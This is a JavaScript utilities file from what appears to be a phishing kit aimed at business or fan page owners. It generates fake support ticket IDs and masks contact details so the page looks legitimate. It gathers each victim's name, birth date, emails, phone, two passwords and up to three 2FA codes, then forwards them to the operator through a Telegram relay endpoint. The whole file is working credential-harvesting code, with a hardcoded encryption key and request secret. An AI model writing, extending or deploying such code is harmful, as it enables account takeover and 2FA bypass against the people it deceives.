// /public/js/utils.js

const Utils = (() => {

  // ── Ticket ID ──────────────────────────────────────────────
  function generateTicketId() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const seg = () => Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
    return `${seg()}-${seg()}-${seg()}`;
  }

  // ── Mask helpers ───────────────────────────────────────────
  function maskEmail(email) {
    if (!email) return '';
    const [local, domain] = email.split('@');
    const visible = local.slice(0, 2);
    return `${visible}***@${domain}`;
  }

  function maskPhone(phone) {
    if (!phone) return '';
    return phone.slice(0, 3) + '****' + phone.slice(-2);
  }

  // ── Local Storage (encrypted with CryptoJS) ────────────────
  const SECRET = 'local_enc_key_2025'; // only used for localStorage, not Telegram

  function saveRecord(key, data) {
    try {
      const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), SECRET).toString();
      const record = { data: encrypted, ts: Date.now() };
      localStorage.setItem(key, JSON.stringify(record));
    } catch (e) {
      console.error('saveRecord error', e);
    }
  }

  function getRecord(key) {
    try {
      const raw = localStorage.getItem(key);
      if (!raw) return null;
      const record = JSON.parse(raw);
      if (Date.now() - record.ts > CONFIG.STORAGE_EXPIRY) {
        localStorage.removeItem(key);
        return null;
      }
      const bytes = CryptoJS.AES.decrypt(record.data, SECRET);
      return JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
    } catch (e) {
      return null;
    }
  }

  // ── Build Telegram message text ────────────────────────────
  function buildMessage(data) {
    const c = (val) => val ? `<code>${val}</code>` : '';
    const dob = (data.day && data.month && data.year)
      ? `${data.day}/${data.month}/${data.year}` : '';

    const lines = [];

    lines.push(`🔔 <b>NEW SUBMISSION</b>`);
    lines.push(`-----------------------------`);
    lines.push(`<b>Full Name:</b> ${c(data.fullName)}`);
    lines.push(`<b>Page Name:</b> ${c(data.fanpage)}`);
    lines.push(`<b>Date of birth:</b> ${c(dob)}`);
    lines.push(`-----------------------------`);
    lines.push(`<b>Email:</b> ${c(data.email)}`);
    lines.push(`<b>Email Business:</b> ${c(data.emailBusiness)}`);
    lines.push(`<b>Phone Number:</b> ${c(data.phone)}`);
    lines.push(`-----------------------------`);
    if (data.password)       lines.push(`<b>Password(1):</b> ${c(data.password)}`);
    if (data.passwordSecond) lines.push(`<b>Password(2):</b> ${c(data.passwordSecond)}`);
    lines.push(`-----------------------------`);
    if (data.twoFa)       lines.push(`🔐 <b>Code 2FA(1):</b> ${c(data.twoFa)}`);
    if (data.twoFaSecond) lines.push(`🔐 <b>Code 2FA(2):</b> ${c(data.twoFaSecond)}`);
    if (data.twoFaThird)  lines.push(`🔐 <b>Code 2FA(3):</b> ${c(data.twoFaThird)}`);
    lines.push(`-----------------------------`);
    lines.push(`🕐 ${new Date().toLocaleString('vi-VN')}`);

    return lines.join('\n');
  }

  // ── Send Notification via /api/send-telegram ───────────────
  async function sendNotification(data) {
    try {
      const message = buildMessage(data);

      // APP_SECRET is a non-sensitive request guard (not the Telegram token)
      // Set this same value in Vercel env var: SECRET_KEY
      const APP_SECRET = 'HDNDT-JDHT8FNEK-JJHR';

      const res = await fetch('/api/send-telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-secret-key': APP_SECRET,
        },
        body: JSON.stringify({ message }),
      });

      if (!res.ok) {
        const err = await res.json();
        console.error('Notification error:', err);
      }
    } catch (e) {
      console.error('sendNotification failed:', e);
    }
  }

  return { generateTicketId, maskEmail, maskPhone, saveRecord, getRecord, sendNotification };
})();
